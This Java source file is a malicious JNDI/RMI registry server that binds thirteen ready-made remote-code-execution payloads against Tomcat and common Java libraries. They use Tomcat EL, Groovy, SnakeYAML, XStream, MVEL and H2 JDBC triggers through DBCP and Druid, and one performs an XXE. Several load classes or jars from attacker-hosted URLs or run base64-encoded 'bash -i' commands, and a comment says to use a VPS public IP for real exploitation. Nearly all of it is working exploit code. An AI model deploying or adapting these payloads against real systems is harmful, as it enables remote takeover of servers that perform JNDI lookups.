package com.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class RmiServer {

    public static ReferenceWrapper tomcat_EL() throws RemoteException, NamingException {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['curl','baidu.com']).start()\")"));
        return new ReferenceWrapper(ref);
    }

    public static ReferenceWrapper tomcat_EL_Runtime() throws RemoteException, NamingException {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"open -a Calculator.app\")"));
        return new ReferenceWrapper(ref);
    }

    private static ReferenceWrapper tomcat_groovy() throws RemoteException, NamingException {
            /*
            blue.groovy
            @groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator")})
            class Person{}

            groovy blue.groovy
            */
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=addClasspath,b=loadClass"));
        ref.add(new StringRefAddr("a", "http://127.0.0.1:8888/"));
        ref.add(new StringRefAddr("b", "blue"));
        return new ReferenceWrapper(ref);
    }


    private static ReferenceWrapper tomcat_snakeyaml() throws RemoteException, NamingException {
        // https://github.com/artsploit/yaml-payload
        /*
        修改恶意代码: https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java
        javac src/artsploit/AwesomeScriptEngineFactory.java
        jar -cvf yaml-payload.jar -C src/ .
         */
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:9999/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return new ReferenceWrapper(ref);
    }

    private static ReferenceWrapper tomcat_xstream() throws RemoteException, NamingException {
        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='sun.tracing.NullProvider'>\n" +
                "        <active>true</active>\n" +
                "        <providerType>java.lang.Comparable</providerType>\n" +
                "        <probes>\n" +
                "          <entry>\n" +
                "            <method>\n" +
                "              <class>java.lang.Comparable</class>\n" +
                "              <name>compareTo</name>\n" +
                "              <parameter-types>\n" +
                "                <class>java.lang.Object</class>\n" +
                "              </parameter-types>\n" +
                "            </method>\n" +
                "            <sun.tracing.dtrace.DTraceProbe>\n" +
                "              <proxy class='java.lang.Runtime'/>\n" +
                "              <implementing__method>\n" +
                "                <class>java.lang.Runtime</class>\n" +
                "                <name>exec</name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.String</class>\n" +
                "                </parameter-types>\n" +
                "              </implementing__method>\n" +
                "            </sun.tracing.dtrace.DTraceProbe>\n" +
                "          </entry>\n" +
                "        </probes>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>bash -c {echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==}|{base64,-d}|{bash,-i}</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        ref.add(new StringRefAddr("forceString", "a=fromXML"));
        ref.add(new StringRefAddr("a", xml));
        return new ReferenceWrapper(ref);
    }

    private static ReferenceWrapper tomcat_MVEL() throws RemoteException, NamingException {
    ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=exec"));
        ref.add(new StringRefAddr("a",
                "Runtime.getRuntime().exec('bash -c {echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==}|{base64,-d}|{bash,-i}');"));
        return new ReferenceWrapper(ref);
    }

    private static ReferenceWrapper tomcat_XXE() throws RemoteException, NamingException{
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:6666/exp.xml"));
        /*
        <?xml version='1.0' encoding='utf-8'?>
        <!DOCTYPE lolz [
        <!ENTITY test SYSTEM "http://127.0.0.1:6666/">]>
        <lolz>&test;</lolz>
         */
        return new ReferenceWrapper(ref);
    }

    private static ReferenceWrapper tomcat_dbcp2_RCE() throws RemoteException, NamingException {
        return new ReferenceWrapper(dbcpByFactory("org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory"));
    }
    private static ReferenceWrapper tomcat_dbcp1_RCE() throws RemoteException, NamingException {
        return new ReferenceWrapper(dbcpByFactory("org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory"));
    }
    private static ReferenceWrapper commons_dbcp2_RCE() throws RemoteException, NamingException {
        return new ReferenceWrapper(dbcpByFactory("org.apache.commons.dbcp2.BasicDataSourceFactory"));
    }
    private static ReferenceWrapper commons_dbcp1_RCE() throws RemoteException, NamingException {
        return new ReferenceWrapper(dbcpByFactory("org.apache.commons.dbcp.BasicDataSourceFactory"));
    }

    private static ReferenceWrapper tomcat_JDBC_RCE() throws RemoteException, NamingException {
        return new ReferenceWrapper(dbcpByFactory("org.apache.tomcat.jdbc.pool.DataSourceFactory"));
    }
    private static Reference dbcpByFactory(String factory){
        Reference ref = new Reference("javax.sql.DataSource",factory,null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('bash -c {echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==}|{base64,-d}|{bash,-i}')\n" +
                "$$\n";
        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username","root"));
        ref.add(new StringRefAddr("password","password"));
        ref.add(new StringRefAddr("initialSize","1"));
        return ref;
    }

    private static ReferenceWrapper druid() throws RemoteException, NamingException {
        Reference ref = new Reference("javax.sql.DataSource","com.alibaba.druid.pool.DruidDataSourceFactory",null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\n" +
                "$$\n";
        String JDBC_USER = "root";
        String JDBC_PASSWORD = "password";

        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username",JDBC_USER));
        ref.add(new StringRefAddr("password",JDBC_PASSWORD));
        ref.add(new StringRefAddr("initialSize","1"));
        ref.add(new StringRefAddr("init","true"));
        return new ReferenceWrapper(ref);
    }



    public static void main(String[] args) throws Exception{
        System.out.println("Creating RMI Registry, RMI Port: 1099");
        Registry registry = LocateRegistry.createRegistry(1099);
        System.setProperty("java.rmi.server.hostname","0.0.0.0"); //本地测试的时候是0.0.0.0，如果是服务器利用的时候改成VPS的外网IP地址，否则会客户端会加载0.0.0.0

        registry.bind("tomcat_el",RmiServer.tomcat_EL());
        registry.bind("tomcat_el_runtime",RmiServer.tomcat_EL_Runtime());
        registry.bind("tomcat_groovy",RmiServer.tomcat_groovy());
        registry.bind("tomcat_snakeyaml",RmiServer.tomcat_snakeyaml());
        registry.bind("tomcat_xstream",RmiServer.tomcat_xstream());
        registry.bind("tomcat_MVEL",RmiServer.tomcat_MVEL());
        registry.bind("tomcat_xxe",RmiServer.tomcat_XXE());
        registry.bind("tomcat_dbcp2_RCE",RmiServer.tomcat_dbcp2_RCE());
        registry.bind("tomcat_dbcp1_RCE",RmiServer.tomcat_dbcp1_RCE());
        registry.bind("commons_dbcp2_RCE",RmiServer.commons_dbcp2_RCE());
        registry.bind("commons_dbcp1_RCE",RmiServer.commons_dbcp1_RCE());
        registry.bind("tomcat_JDBC_RCE",RmiServer.tomcat_JDBC_RCE());
        registry.bind("druid",RmiServer.druid());
    }
}
